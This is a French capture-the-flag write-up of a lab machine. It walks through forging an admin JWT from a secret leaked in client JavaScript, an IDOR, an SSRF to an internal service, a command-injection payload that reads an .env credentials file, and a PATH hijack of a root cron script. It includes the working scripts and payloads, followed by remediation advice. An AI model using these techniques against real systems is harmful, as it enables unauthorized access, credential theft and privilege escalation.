# RedTeam-TG — un secret JWT dans le JS, une SSRF, et un PATH qui traîne

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/redteam-tg/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Le secret de signature JWT est codé en dur dans
> `/static/app.js`. Je me forge un jeton `role=admin`, je passe admin, puis un
> IDOR me donne un jeton de réinitialisation. De là, une SSRF vers un service ops
> interne (`127.0.0.1:8081`) expose un `/ops/export` vulnérable à l'injection de
> commande : shell en `www-data`. Le compte `deploy` récupéré mène à une boucle
> root qui lance `sync.sh` avec un dossier inscriptible en tête de `PATH` — je
> détourne `date` et je passe root. **Flag :** `/root/root.txt` → `NCTF{…}`.

## 1. Briefing

Boot2root de la finale. Un seul flag en `chmod 600`. Une API web, un service ops
caché, et une escalade root qui tient à une variable `PATH` mal pensée.

| Champ | Valeur |
|-------|--------|
| Cible | lab éphémère — web + SSH |
| Chaîne | JWT forgé |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl -s http://<ip>/api/version
```

Les six ports hauts habituels (`3000`, `4848`, `5601`, `8082`, `9090`, `8888`)
sont des leurres. Le vrai sujet, c'est l'API et son authentification par jeton.
Premier réflexe sur une SPA : lire le JavaScript.

## 3. Analyse

```bash
curl -s http://<ip>/static/app.js | grep -i secret
# const JWT_SECRET = "s3cr3t_...";
```

Le secret HS256 est servi au client. N'importe qui peut donc signer ses propres
jetons. Je prends un jeton invité légitime pour voir la structure, puis je la
rejoue avec `role: "admin"`.

## 4. Exploitation

### Étape 1 — forger un jeton admin

```python
import hmac, hashlib, base64, json, time, requests

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def jwt(payload, secret):
    h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
    p = b64(json.dumps(payload, separators=(",",":")).encode())
    sig = b64(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

secret = "s3cr3t_..."   # extrait de app.js
token = jwt({"sub":1,"user":"admin","role":"admin","iat":int(time.time())}, secret)
```

### Étape 2 — IDOR sur /api/users/1

Avec le jeton admin, j'énumère les comptes. `/api/users/1` renvoie plus que
prévu, dont un jeton de réinitialisation qui débloque les fonctions ops.

```bash
curl -s http://<ip>/api/users/1 -H "Authorization: Bearer $TOKEN"
```

### Étape 3 — SSRF vers le service ops interne

Une fonction d'export accepte une URL et la récupère côté serveur. Je la pointe
sur le service ops qui n'écoute qu'en local :

```text
http://127.0.0.1:8081/ops/export?...
```

### Étape 4 — injection de commande dans /ops/export

`/ops/export` construit une commande shell à partir d'un paramètre sans le
filtrer. J'injecte :

```text
name=x; cat /opt/app/.env; #
```

La sortie me donne le `.env` en `www-data`, avec les identifiants `deploy`.

### Étape 5 — deploy et la boucle root

```bash
ssh deploy@<ip>
ls -l /opt/jobs /opt/jobs/bin
# une boucle root exécute /opt/jobs/sync.sh périodiquement,
# avec /opt/jobs/bin EN TÊTE de PATH — et ce dossier m'est inscriptible
```

`sync.sh` appelle `date` (sans chemin absolu). Comme `/opt/jobs/bin` est au début
du `PATH` de la boucle root, j'y dépose mon propre `date` :

```bash
cat > /opt/jobs/bin/date <<'EOF'
#!/bin/sh
cp /root/root.txt /tmp/rootflag && chmod 644 /tmp/rootflag
exec /bin/date "$@"
EOF
chmod +x /opt/jobs/bin/date
# au prochain tick de la boucle root :
cat /tmp/rootflag
```

## 5. Flag

```text
NCTF{…}
```

## 6. Impasses & leurres

- **Ports hauts décoratifs** : ils répondent, aucun ne mène à un secret.
- **SSRF aveugle d'abord** : `/ops/export` ne renvoie pas toujours le corps ;
  l'injection de commande sert justement à exfiltrer la sortie.
- **PATH hijack qui ne déclenche pas** : vérifier que `sync.sh` appelle bien un
  binaire sans chemin absolu, et attendre le tick de la boucle (ne pas l'exécuter
  soi-même, on resterait `deploy`).

## 7. Leçons & remédiation

- **Un secret JWT n'est jamais côté client.** Le garder côté serveur, et préférer
  une signature asymétrique (RS256) si un client doit vérifier sans signer.
- **IDOR** : vérifier l'autorisation par objet, pas seulement l'authentification.
  Un admin ne devrait pas voir les jetons de réinitialisation d'autrui.
- **SSRF** : valider et restreindre les URL sortantes ; ne pas exposer de service
  ops sensible en confiance sur `127.0.0.1`.
- **Injection de commande** : passer les arguments à `exec`/`subprocess` sans
  shell, jamais par concaténation.
- **PATH hijack** : les scripts root doivent utiliser des chemins absolus et un
  `PATH` fixe ; aucun dossier du `PATH` root ne doit être inscriptible par un
  autre compte.

## 8. Annexe — chaîne résumée

```text
app.js (JWT_SECRET) → jeton admin forgé → IDOR /api/users/1
   → SSRF 127.0.0.1:8081 → injection /ops/export → .env (www-data)
   → ssh deploy → PATH hijack /opt/jobs/bin/date → /root/root.txt
```
